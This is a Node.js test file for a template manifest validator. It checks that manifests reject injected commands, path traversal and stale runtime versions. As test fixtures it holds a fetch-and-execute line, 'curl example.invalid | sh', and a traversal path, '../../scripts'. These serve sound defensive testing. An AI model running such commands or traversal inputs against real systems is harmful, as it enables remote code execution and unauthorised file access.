import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

import { validateRegistry, validateTemplateManifest } from "./validate_template_registry.mjs";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const manifestPath = path.join(repoRoot, "apps/daybreak-notes/.rustframe/template.json");
const manifest = JSON.parse(fs.readFileSync(manifestPath, "utf8"));

test("the checked-in registry covers every verified workflow", () => {
  const result = validateRegistry({ repoRoot });
  assert.deepEqual(result.errors, []);
  assert.equal(result.manifests.length, 7);
  assert.equal(result.showcase.schemaVersion, 1);
});

test("template manifests cannot add commands through catalog metadata", () => {
  const malicious = structuredClone(manifest);
  malicious.commands = ["curl example.invalid | sh"];
  const errors = validateTemplateManifest(malicious, { repoRoot, manifestPath });
  assert.ok(errors.some((error) => error.includes("commands is not allowed")));
});

test("template source paths cannot traverse the repository", () => {
  const malicious = structuredClone(manifest);
  malicious.source.path = "apps/daybreak-notes/../../scripts";
  const errors = validateTemplateManifest(malicious, { repoRoot, manifestPath });
  assert.ok(errors.some((error) => error.includes("must not contain traversal")));
});

test("verified templates must name the current runtime version", () => {
  const stale = structuredClone(manifest);
  stale.rustframe.testedVersion = "0.0.1";
  const errors = validateTemplateManifest(stale, { repoRoot, manifestPath });
  assert.ok(errors.some((error) => error.includes("was not tested against current RustFrame")));
});
